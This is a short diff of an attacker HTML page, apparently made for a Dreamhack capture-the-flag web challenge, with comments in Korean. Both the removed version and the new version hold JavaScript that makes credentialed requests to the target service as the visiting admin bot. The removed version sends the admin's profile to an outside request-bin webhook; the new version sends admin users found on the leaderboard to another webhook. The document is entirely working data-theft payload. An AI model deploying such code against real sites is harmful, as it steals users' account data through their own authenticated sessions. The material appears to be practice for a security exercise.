@@ -1,38 +1,30 @@
-<!-- 당신의 atk.html 페이지에서 -->
 <script>
-async function getAdminInfo() {
+async function findAdminInLeaderboard() {
     try {
-        // Admin 봇이 방문했을 때 자신의 프로필 정보 수집
-        const profileResp = await fetch('http://127.0.0.1:5555/api/profile', {
+        const leaderboardResp = await fetch('http://127.0.0.1:5555/api/leaderboard', {
             credentials: 'include'
         });
         
-        if (profileResp.ok) {
-            const adminProfile = await profileResp.json();
+        if (leaderboardResp.ok) {
+            const leaderboard = await leaderboardResp.json();
             
-            // Webhook으로 Admin 정보 전송
-            const adminInfo = {
-                admin_username: adminProfile.username,
-                admin_user_id: adminProfile.user_id,
-                admin_display_name: adminProfile.display_name,  // 🎯 이것!
-                admin_user_kind: adminProfile.user_kind
-            };
+            // Admin- 으로 시작하는 사용자 찾기
+            const adminUsers = leaderboard.users.filter(user => 
+                user.username.startsWith('Admin-')
+            );
             
-            await fetch('https://atefpeg.request.dreamhack.games', {
+            await fetch('https://rsqwmeg.request.dreamhack.games', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    type: 'admin_info_extracted',
-                    data: adminInfo
+                    type: 'admin_users_found',
+                    admins: adminUsers
                 }),
                 mode: 'no-cors'
             });
         }
     } catch (e) {
-        console.log('Failed to get admin info:', e);
+        console.log('Failed to get leaderboard:', e);
     }
 }
-
-// 페이지 로드 시 실행
-window.onload = getAdminInfo;
 </script>
